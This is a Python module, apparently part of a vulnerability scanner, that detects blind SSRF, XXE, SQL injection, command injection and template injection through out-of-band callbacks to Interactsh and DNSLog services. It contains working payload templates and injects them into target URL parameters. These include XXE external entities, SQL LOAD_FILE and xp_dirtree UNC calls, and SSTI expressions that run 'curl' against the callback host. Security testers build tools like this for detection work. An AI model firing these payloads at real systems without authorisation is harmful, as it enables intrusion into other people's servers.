#!/usr/bin/env python3
"""
OOB带外检测模块 - 支持盲SSRF/XXE/SQLi检测
集成 Interactsh 和 DNSLog 平台
"""

import base64
import hashlib
import logging
import os
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Tuple

try:
    import requests

    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# 统一 HTTP 客户端工厂
try:
    from core.http import get_sync_client

    HAS_HTTP_FACTORY = True
except ImportError:
    HAS_HTTP_FACTORY = False


@dataclass
class OOBInteraction:
    """OOB交互记录"""

    timestamp: str
    protocol: str  # dns, http, smtp
    remote_address: str
    raw_request: str = ""
    identifier: str = ""


@dataclass
class OOBResult:
    """OOB检测结果"""

    success: bool
    vuln_type: str
    interactions: List[OOBInteraction] = field(default_factory=list)
    callback_url: str = ""
    payload_used: str = ""
    error: str = ""

    @property
    def is_vulnerable(self) -> bool:
        return self.success and len(self.interactions) > 0


class InteractshClient:
    """
    Interactsh 客户端 - 简化版
    使用公共服务器，无需RSA密钥
    """

    PUBLIC_SERVERS = [
        "oast.live",
        "oast.fun",
        "oast.site",
        "interact.sh",
    ]

    def __init__(self, server: str = None):
        self.server = server or self.PUBLIC_SERVERS[0]
        self.correlation_id = self._generate_correlation_id()
        self.secret = hashlib.md5(self.correlation_id.encode()).hexdigest()[:16]
        self._interactions: List[Dict] = []

    def _generate_correlation_id(self) -> str:
        """生成唯一的correlation ID"""
        return uuid.uuid4().hex[:20]

    @property
    def domain(self) -> str:
        """获取回调域名"""
        return f"{self.correlation_id}.{self.server}"

    def generate_url(self, identifier: str = "") -> str:
        """生成带标识符的回调URL"""
        if identifier:
            return f"http://{identifier}.{self.domain}"
        return f"http://{self.domain}"

    def generate_dns(self, identifier: str = "") -> str:
        """生成DNS回调域名"""
        if identifier:
            return f"{identifier}.{self.domain}"
        return self.domain

    def poll(self, timeout: int = 30) -> List[OOBInteraction]:
        """
        轮询检查是否有交互
        注意: 公共Interactsh服务器可能需要注册才能poll
        这里使用简化的DNS查询检测方式
        """
        interactions = []

        # 尝试通过API轮询 (如果服务器支持)
        try:
            poll_url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
            resp = requests.get(poll_url, timeout=5, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get("data", []):
                    interactions.append(
                        OOBInteraction(
                            timestamp=item.get("timestamp", datetime.now().isoformat()),
                            protocol=item.get("protocol", "unknown"),
                            remote_address=item.get("remote-address", ""),
                            raw_request=item.get("raw-request", ""),
                            identifier=item.get("unique-id", ""),
                        )
                    )
        except Exception as exc:
            logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        return interactions


class DNSLogClient:
    """
    DNSLog 客户端 - 备用方案
    支持 dnslog.cn, ceye.io 等平台
    """

    PLATFORMS = {
        "dnslog": {
            "domain_api": "http://www.dnslog.cn/getdomain.php",
            "record_api": "http://www.dnslog.cn/getrecords.php",
        },
        "ceye": {
            "domain": "{identifier}.ceye.io",
            "api": "http://api.ceye.io/v1/records?token={token}&type={type}",
        },
    }

    def __init__(self, platform: str = "dnslog", token: str = None):
        self.platform = platform
        self.token = token or os.getenv("CEYE_TOKEN", "")
        self.domain = None
        # 优先使用统一 HTTP 客户端工厂
        if HAS_HTTP_FACTORY:
            self.session = get_sync_client(force_new=True)
        elif HAS_REQUESTS:
            self.session = requests.Session()
        else:
            self.session = None
        self._init_domain()

    def _init_domain(self):
        """初始化获取域名"""
        if self.platform == "dnslog" and self.session:
            try:
                resp = self.session.get(self.PLATFORMS["dnslog"]["domain_api"], timeout=5)
                if resp.status_code == 200:
                    self.domain = resp.text.strip()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        elif self.platform == "ceye" and self.token:
            self.domain = f"{uuid.uuid4().hex[:8]}.ceye.io"

    def generate_subdomain(self, identifier: str) -> str:
        """生成子域名"""
        if self.domain:
            return f"{identifier}.{self.domain}"
        return ""

    def poll(self) -> List[OOBInteraction]:
        """轮询DNS记录"""
        interactions = []

        if self.platform == "dnslog" and self.session:
            try:
                resp = self.session.get(self.PLATFORMS["dnslog"]["record_api"], timeout=5)
                if resp.status_code == 200:
                    records = resp.json() if resp.text.startswith("[") else []
                    for record in records:
                        interactions.append(
                            OOBInteraction(
                                timestamp=datetime.now().isoformat(),
                                protocol="dns",
                                remote_address=record.get("ip", ""),
                                identifier=record.get("subdomain", ""),
                            )
                        )
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        return interactions


class OOBDetector:
    """
    统一OOB检测器
    支持多种漏洞类型的带外检测
    """

    # 各漏洞类型的OOB Payload模板
    PAYLOAD_TEMPLATES = {
        "ssrf": [
            "http://{callback}",
            "https://{callback}",
            "http://{callback}/ssrf",
            "gopher://{callback}:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20{callback}",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}">%xxe;]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]>',
        ],
        "sqli": [
            "' AND LOAD_FILE('\\\\\\\\{callback}\\\\a')--",
            "'; EXEC master..xp_dirtree '\\\\\\\\{callback}\\\\a'--",
            "' UNION SELECT LOAD_FILE('\\\\\\\\{callback}\\\\a')--",
        ],
        "rce": [
            "curl http://{callback}/rce",
            "wget http://{callback}/rce",
            "ping -c 1 {callback_dns}",
            "nslookup {callback_dns}",
        ],
        "ssti": [
            "${{T(java.lang.Runtime).getRuntime().exec('curl http://{callback}')}}",
            "{{config.__class__.__init__.__globals__['os'].popen('curl http://{callback}').read()}}",
        ],
    }

    def __init__(self, platform: str = "interactsh"):
        """
        初始化OOB检测器

        Args:
            platform: 使用的平台 (interactsh/dnslog)
        """
        self.platform = platform
        self._client = None
        self._pending: Dict[str, Dict] = {}  # identifier -> {vuln_type, url, timestamp}
        self._init_client()

    def _init_client(self):
        """初始化客户端"""
        if self.platform == "interactsh":
            self._client = InteractshClient()
        else:
            self._client = DNSLogClient(platform=self.platform)

    @property
    def callback_domain(self) -> str:
        """获取回调域名"""
        if isinstance(self._client, InteractshClient):
            return self._client.domain
        elif isinstance(self._client, DNSLogClient):
            return self._client.domain or ""
        return ""

    def generate_callback(self, vuln_type: str, context: str = "") -> Tuple[str, str]:
        """
        生成唯一回调URL

        Args:
            vuln_type: 漏洞类型 (ssrf/xxe/sqli/rce)
            context: 上下文标识

        Returns:
            (callback_url, identifier)
        """
        identifier = f"{vuln_type[:3]}{uuid.uuid4().hex[:6]}"

        if isinstance(self._client, InteractshClient):
            callback_url = self._client.generate_url(identifier)
            callback_dns = self._client.generate_dns(identifier)
        else:
            callback_url = f"http://{self._client.generate_subdomain(identifier)}"
            callback_dns = self._client.generate_subdomain(identifier)

        # 记录pending
        self._pending[identifier] = {
            "vuln_type": vuln_type,
            "context": context,
            "timestamp": datetime.now().isoformat(),
            "callback_url": callback_url,
            "callback_dns": callback_dns,
        }

        return callback_url, identifier

    def get_payloads(self, vuln_type: str) -> List[str]:
        """
        获取指定漏洞类型的OOB Payload

        Args:
            vuln_type: 漏洞类型

        Returns:
            Payload列表
        """
        callback_url, identifier = self.generate_callback(vuln_type)
        callback_dns = self._pending[identifier]["callback_dns"]

        templates = self.PAYLOAD_TEMPLATES.get(vuln_type, [])
        payloads = []

        for template in templates:
            payload = template.format(
                callback=callback_url.replace("http://", ""), callback_dns=callback_dns
            )
            payloads.append(payload)

        return payloads

    def inject_and_wait(
        self, url: str, param: str, vuln_type: str, timeout: int = 30, method: str = "GET"
    ) -> OOBResult:
        """
        注入Payload并等待回调

        Args:
            url: 目标URL
            param: 注入参数
            vuln_type: 漏洞类型
            timeout: 等待超时(秒)
            method: HTTP方法

        Returns:
            OOBResult
        """
        if not HAS_REQUESTS:
            return OOBResult(success=False, vuln_type=vuln_type, error="requests库未安装")

        payloads = self.get_payloads(vuln_type)
        if not payloads:
            return OOBResult(
                success=False, vuln_type=vuln_type, error=f"无{vuln_type}类型的Payload"
            )

        # 发送所有Payload
        for payload in payloads:
            try:
                if method.upper() == "GET":
                    test_url = (
                        f"{url}?{param}={requests.utils.quote(payload)}"
                        if "?" not in url
                        else f"{url}&{param}={requests.utils.quote(payload)}"
                    )
                    requests.get(test_url, timeout=10, verify=False)
                else:
                    requests.post(url, data={param: payload}, timeout=10, verify=False)
            except (requests.RequestException, OSError):
                continue

        # 等待回调
        start_time = time.time()
        interactions = []

        while time.time() - start_time < timeout:
            time.sleep(2)
            new_interactions = self._client.poll()
            if new_interactions:
                interactions.extend(new_interactions)
                break

        return OOBResult(
            success=len(interactions) > 0,
            vuln_type=vuln_type,
            interactions=interactions,
            callback_url=self.callback_domain,
            payload_used=payloads[0] if payloads else "",
        )

    def check_interactions(self) -> List[OOBInteraction]:
        """检查所有交互"""
        return self._client.poll()


# 便捷函数
def create_oob_detector(platform: str = "interactsh") -> OOBDetector:
    """创建OOB检测器"""
    return OOBDetector(platform=platform)


def quick_oob_test(url: str, param: str, vuln_type: str = "ssrf", timeout: int = 30) -> Dict:
    """
    快速OOB测试

    Args:
        url: 目标URL
        param: 测试参数
        vuln_type: 漏洞类型
        timeout: 超时时间

    Returns:
        检测结果字典
    """
    detector = OOBDetector()
    result = detector.inject_and_wait(url, param, vuln_type, timeout)

    return {
        "success": result.success,
        "vulnerable": result.is_vulnerable,
        "vuln_type": result.vuln_type,
        "interactions_count": len(result.interactions),
        "callback_url": result.callback_url,
        "payload_used": result.payload_used,
        "error": result.error,
    }
